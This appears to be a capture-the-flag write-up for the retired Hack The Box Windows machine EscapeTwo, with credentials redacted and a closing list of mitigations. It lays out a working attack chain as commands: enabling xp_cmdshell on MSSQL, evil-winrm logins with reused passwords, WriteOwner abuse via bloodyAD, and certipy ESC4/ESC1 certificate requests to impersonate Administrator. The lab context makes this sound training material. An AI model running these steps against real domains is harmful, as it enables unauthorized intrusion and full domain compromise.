---
machine: EscapeTwo
os: Windows
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [windows, active-directory, mssql, xp_cmdshell, adcs, writeowner]
---

# EscapeTwo — Hack The Box (Windows)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

The scenario starts with low-privilege domain credentials. A corrupted Excel file on an SMB share leaks MSSQL credentials; `xp_cmdshell` provides access and a reused password enables WinRM. `WriteOwner` over an ADCS account and a misconfigured template lead to Administrator.

## Recon

```bash
nmap -Pn -sC -sV -p53,88,135,139,389,445,1433,5985,9389 <IP>
```

- Domain controller `sequel.htb`.
- SMB, LDAP, Kerberos, MSSQL and WinRM.

## Enumeration

With the `rose` credentials:

```bash
nxc smb <IP> -u rose -p '<PASSWORD>' --shares
smbclient //<IP>/"Accounting Department" -U 'sequel.htb/rose%<PASSWORD>'
```

The share contains spreadsheets. A corrupted `.xlsx` opens as a ZIP and `xl/sharedStrings.xml` exposes users and passwords.

## Foothold

The `sa` credentials allow MSSQL login and enabling `xp_cmdshell`.

```bash
impacket-mssqlclient sequel.htb/sa:'<PASSWORD>'@<IP> -windows-auth
SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
SQL> EXEC xp_cmdshell 'whoami';
```

This yields execution as `sql_svc`.

## Lateral movement

A `sql-Configuration.INI` file contains `ryan`'s cleartext password, reused for WinRM.

```bash
nxc winrm <IP> -u ryan -p '<PASSWORD>'
evil-winrm -i <IP> -u ryan -p '<PASSWORD>'
```

## Privilege escalation

BloodHound shows that `ryan` has `WriteOwner` over `ca_svc`. Ownership allows rewriting the DACL and taking control of the account. With `ca_svc`, ADCS templates are enumerated and a writable template (ESC4) is abused to request a certificate as Administrator (ESC1).

```bash
bloodyAD -d sequel.htb -u ryan -p '<PASSWORD>' --host <IP> set owner ca_svc ryan
certipy find -u ca_svc@sequel.htb -p '<PASSWORD>' -dc-ip <IP> -vulnerable
certipy req -u ca_svc@sequel.htb -p '<PASSWORD>' -ca <CA> -template <TEMPLATE> -upn administrator@sequel.htb
certipy auth -pfx administrator.pfx -dc-ip <IP>
```

The certificate authenticates as Administrator and yields the domain hash.

## Evidence

- SMB share listing and Excel XML, with data redacted.
- `whoami` from `xp_cmdshell`.
- BloodHound and `WriteOwner`.
- ADCS template and issued certificate, without real material.
- Redacted flag.

## Lessons learned

- A corrupted document is still a readable ZIP container.
- `WriteOwner` does not grant direct access, but allows rewriting the DACL.
- A writable ADCS template can turn a service account into Administrator.

## Mitigations and detection

- Do not store credentials in spreadsheets or installation files.
- Disable `xp_cmdshell` and restrict MSSQL access.
- Review dangerous ACLs such as `WriteOwner`, `GenericAll` and `GenericWrite`.
- Audit template changes and certificate requests in ADCS.

## References

- <https://www.hackthebox.com/machines/escapetwo>
- <https://learn.microsoft.com/en-us/sql/relational-databases/security/auditing/audit-server-principal-management>
- <https://attack.mitre.org/techniques/T1552/>
- <https://attack.mitre.org/techniques/T1649/>
